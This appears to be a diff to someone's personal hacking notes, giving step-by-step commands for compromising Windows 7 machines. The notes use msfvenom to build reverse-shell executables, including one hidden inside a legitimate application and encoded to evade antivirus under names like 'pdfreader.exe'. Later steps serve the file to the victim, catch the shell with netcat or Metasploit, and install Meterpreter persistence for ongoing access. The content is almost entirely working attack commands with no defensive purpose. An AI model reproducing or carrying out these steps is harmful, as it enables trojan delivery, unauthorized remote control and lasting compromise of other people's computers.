@@ -28,6 +28,7 @@
 
 
 
+
 --Hacking windows 7 with & without trojan with nc--
 
 > msfvenom - windows/shell_reverse_tcp LHOST=local_ip LPORT=port -f exe -o inject.exe ( -p as payload, LHOST as attack machine IP, LPORT as attack machine port, -f as format, -o as filename to be saved as ) -- without trojan
@@ -100,6 +101,7 @@
 
 
 
+
 --Hacking windows 7 with encoded trojan file with nc--
 
 > msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.6 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /root/Downloads/the_app_needed_by_victim.exe -o pdfreader.exe
@@ -109,3 +111,26 @@
 > nc -nlvp local_port (on attack machine)
 > run the application on target machine
 > check the terminal over attack machine
+
+
+
+
+--Hacking into windows 7 using metasploit and create persistence--
+
+> msfvenom -p windows/reverse_tcp LHOST=local_ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /root/Downloads/the_app_needed_by_victim.exe -o reader.exe
+> python3 -m http.server
+> go to target machine and browse local_ip:port
+> download the reader file (we see no error message or alert message from browser)
+> msfconsole
+> use exploit/multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set lhost local_ip
+> set lport port
+> exploit -j -z
+> run the reader file on target machine
+> ctrl + c on attack machine terminal
+> sessions
+> sessions -i 1
+> run persistence -U -i 5 -p port -r local_ip 
+> exit
+> exploit (now you can connect to the target machine without running exe file on target machine)
